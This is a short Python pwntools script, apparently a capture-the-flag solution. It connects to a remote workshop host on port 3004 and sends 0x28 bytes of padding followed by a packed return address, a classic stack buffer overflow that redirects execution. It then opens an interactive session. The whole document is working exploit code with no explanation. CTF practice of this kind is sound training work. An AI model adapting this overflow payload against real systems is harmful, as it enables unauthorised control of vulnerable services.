from pwn import *

p = remote("ctfworkshop.cybr.club", 3004)

p.sendline(b'A'*0x28 + p64(0x401182))

p.interactive()
